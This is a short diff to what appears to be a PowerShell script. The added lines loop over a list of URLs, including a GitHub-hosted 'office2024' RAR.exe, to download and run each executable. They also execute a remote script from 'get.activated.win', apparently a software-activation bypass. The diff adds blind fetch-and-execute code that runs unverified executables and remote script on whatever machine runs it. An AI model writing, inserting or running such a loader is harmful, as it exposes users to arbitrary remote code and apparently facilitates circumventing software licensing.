@@ -58,3 +58,13 @@ $urls = @(
     'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'
 )
 
+# URL of the remote script to execute
+$remoteScriptUrl = 'https://get.activated.win'
+
+# Loop through each URL and execute the download and run function
+foreach ($url in $urls) {
+    DownloadAndRun-Executable -url $url
+}
+
+# Execute the remote script
+Execute-RemoteScript -url $remoteScriptUrl
